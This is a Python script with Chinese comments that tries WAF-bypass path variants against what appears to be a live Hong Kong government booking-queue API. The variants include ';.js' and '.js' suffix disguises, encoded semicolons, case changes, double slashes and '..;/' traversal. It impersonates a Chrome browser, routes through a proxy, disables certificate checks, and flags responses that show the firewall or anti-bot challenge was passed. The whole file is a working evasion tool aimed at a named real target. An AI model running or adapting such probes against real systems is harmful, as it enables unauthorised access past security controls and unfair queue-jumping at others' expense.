# -*- coding: utf-8 -*-
"""waf_path_probe.py —— WAF 路径/后缀绕过矩阵（专打"按扩展名放行"这个假设）

已知：挑战 JS /RGOj2….js 在浏览器里能 200（WAF 放行 .js）
假设：如果 WAF 规则按 URL 后缀白名单放行，把 API 伪装成 .js 就可能直通后端
      （Spring 对 `;matrix` 参数不改变路由，`;.js` 仍然命中 /enqueue）

判定：
  412 = 还在挑战
  400 = WAF 判非法（后缀没骗过，或者后端拒）
  404 = 到了后端但路径不存在（说明**穿过了 WAF**）
  200 = 成了

用法：
  python waf_path_probe.py --proxy http://ip:port
  python waf_path_probe.py --proxy http://ip:port --only 0,2,4
"""
from __future__ import annotations
import argparse, sys, time
from curl_cffi import requests as creq

HOST3, HOST4 = "https://abs3.td.gov.hk", "https://abs4.td.gov.hk"
C, E = "tdabsditest", "tdabsd261111kla"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")

# (名称, method, url, headers)
VARIANTS = [
    ("0 baseline enqueue", "POST", f"{HOST4}/spa-api/queue/{C}/{E}/enqueue", {}),
    ("1 ;.js", "POST", f"{HOST4}/spa-api/queue/{C}/{E}/enqueue;.js", {}),
    ("2 .js 后缀", "POST", f"{HOST4}/spa-api/queue/{C}/{E}/enqueue.js", {}),
    ("3 %3B.js", "POST", f"{HOST4}/spa-api/queue/{C}/{E}/enqueue%3B.js", {}),
    ("4 静态业务JS", "GET", f"{HOST3}/static/js/main.fca89098.js", {}),
    ("5 manifest", "GET", f"{HOST3}/manifest.json", {}),
    ("6 favicon", "GET", f"{HOST3}/favicon.ico", {}),
    ("7 双斜杠", "GET", f"{HOST3}//?lang=sc", {}),
    ("8 路径;.js", "GET", f"{HOST3}/;.js?lang=sc", {}),
    ("9 条件请求", "GET", f"{HOST3}/?lang=sc", {"If-None-Match": "*", "If-Modified-Since": "Wed, 11 Nov 2026 00:00:00 GMT"}),
    ("10 Range", "GET", f"{HOST3}/?lang=sc", {"Range": "bytes=0-1024"}),
    ("11 大写路径", "POST", f"{HOST4}/SPA-API/queue/{C}/{E}/enqueue", {}),
    ("12 双写", "POST", f"{HOST4}/spa-api//queue/{C}/{E}/enqueue", {}),
    ("13 ..;/", "POST", f"{HOST4}/spa-api/queue/{C}/{E}/../{E}/enqueue", {}),
]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--proxy", default="")
    ap.add_argument("--only", default="", help="只跑这些序号，逗号分隔")
    ap.add_argument("--gap", type=float, default=1.5)
    a = ap.parse_args()
    idx = set(int(x) for x in a.only.split(",") if x.strip()) if a.only else None

    for i, (name, method, url, hdr) in enumerate(VARIANTS):
        if idx is not None and i not in idx:
            continue
        kw = {"impersonate": "chrome", "timeout": 20, "verify": False,
              "allow_redirects": False,
              "headers": {"User-Agent": UA, "Accept": "*/*", **hdr}}
        if a.proxy:
            kw["proxies"] = {"http": a.proxy, "https": a.proxy}
        s = creq.Session(**kw)
        t0 = time.time()
        try:
            if method == "POST":
                r = s.post(url, json={}, headers={"Content-Type": "application/json"})
            else:
                r = s.get(url)
            b = r.content or b""
            txt = b[:120].decode("utf-8", "ignore").replace("\n", " ")
            flag = ""
            if r.status_code in (200, 302):
                flag = "  ★★★★★ 通过"
            elif r.status_code == 404:
                flag = "  ★★★ 到后端了(404)"
            print(f"[{name:18}] {r.status_code}  len={len(b):6}  {time.time()-t0:.2f}s  {txt[:90]}{flag}")
        except Exception as e:
            print(f"[{name:18}] EXC {type(e).__name__}: {str(e)[:90]}")
        time.sleep(a.gap)


if __name__ == "__main__":
    main()
